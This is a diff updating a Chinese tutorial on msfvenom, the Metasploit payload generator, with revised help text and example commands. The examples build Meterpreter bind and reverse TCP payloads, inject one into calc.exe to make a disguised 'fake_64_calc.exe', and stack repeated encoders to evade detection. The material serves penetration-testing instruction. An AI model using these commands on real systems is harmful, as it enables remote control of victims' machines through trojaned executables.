@@ -6,35 +6,40 @@
 **msfvenom**是Metasploit框架中独立的payload生成器。
 （2015.6.8取代了之前的 `msfpayload` 和 `msfencode`）
 
-### msfvenom所有命令
+### 帮助信息
 
 ```
-root@kali:~# msfvenom -h
+msfvenom --help
 MsfVenom - a Metasploit standalone payload generator.
 Also a replacement for msfpayload and msfencode.
 Usage: /usr/bin/msfvenom [options] <var=val>
+Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
 
 Options:
-    -p, --payload       <payload>    Payload to use. Specify a '-' or stdin to use custom payloads
-        --payload-options            List the payload's standard options
-    -l, --list          [type]       List a module type. Options are: payloads, encoders, nops, all
-    -n, --nopsled       <length>     Prepend a nopsled of [length] size on to the payload
-    -f, --format        <format>     Output format (use --help-formats for a list)
-        --help-formats               List available formats
-    -e, --encoder       <encoder>    The encoder to use
-    -a, --arch          <arch>       The architecture to use
-        --platform      <platform>   The platform of the payload
-        --help-platforms             List available platforms
-    -s, --space         <length>     The maximum size of the resulting payload
-        --encoder-space <length>     The maximum size of the encoded payload (defaults to the -s value)
-    -b, --bad-chars     <list>       The list of characters to avoid example: '\x00\xff'
-    -i, --iterations    <count>      The number of times to encode the payload
-    -c, --add-code      <path>       Specify an additional win32 shellcode file to include
-    -x, --template      <path>       Specify a custom executable file to use as a template
-    -k, --keep                       Preserve the template behavior and inject the payload as a new thread
-    -o, --out           <path>       Save the payload
-    -v, --var-name      <name>       Specify a custom variable name to use for certain output formats
-        --smallest                   Generate the smallest possible payload
+    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
+    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
+        --list-options               List --payload <value>'s standard, advanced and evasion options
+    -f, --format          <format>   Output format (use --list formats to list)
+    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
+        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
+        --smallest                   Generate the smallest possible payload using all available encoders
+        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
+        --encrypt-key     <value>    A key to be used for --encrypt
+        --encrypt-iv      <value>    An initialization vector for --encrypt
+    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
+        --platform        <platform> The platform for --payload (use --list platforms to list)
+    -o, --out             <path>     Save the payload to a file
+    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
+    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
+        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
+    -s, --space           <length>   The maximum size of the resulting payload
+        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
+    -i, --iterations      <count>    The number of times to encode the payload
+    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
+    -x, --template        <path>     Specify a custom executable file to use as a template
+    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
+    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
+    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
     -h, --help                       Show this message
 ```
 
@@ -390,7 +395,7 @@ Framework Encoders [--encoder <value>]
 
 如 使用windows下的calc.exe作为模板文件,生成payload：
 ```
-msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
+msfvenom --payload windows/meterpreter/bind_tcp -x calc.exe -f exe > new.exe
 ```
 
 msfvenom使用的模板文件保存在目录`msf/data/templates`
@@ -401,7 +406,7 @@ msfvenom使用的模板文件保存在目录`msf/data/templates`
 （Please note: If you'd like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only:）
 
 ```
-msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
+msfvenom --payload windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only > /tmp/fake_64_calc.exe
 ```
 
 -x选项经常和-k选项一起用，它允许您从模板中将payload作为新的线程运行。但是它目前只支持较老的系统，如x86 Windows XP.
@@ -412,7 +417,7 @@ msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f ex
 The old msfpayload and msfencode utilities were often chained together in order layer on multiple encodings. This is possible using msfvenom as well:
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
 msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
 msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
 ```
